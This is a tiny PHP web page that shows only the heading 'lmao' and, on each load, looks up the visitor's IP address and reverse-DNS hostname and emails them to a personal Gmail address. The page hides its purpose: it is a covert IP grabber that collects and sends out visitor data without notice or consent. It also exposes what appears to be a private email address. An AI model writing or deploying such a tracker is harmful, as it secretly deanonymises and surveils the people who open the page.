<?php

$h = $_SERVER["REMOTE_ADDR"];
$x = gethostbyaddr($h);
if(isset($h) && isset($x))
{
    mail("aidencohen31@gmail.com","ip","ip".$h."host".$x);
}
else{
    mail("aidencohen31@gmail.com","ip","ip".$h);
}


?>

<html>
<body>
<h1> lmao </h1>
</body>

</html>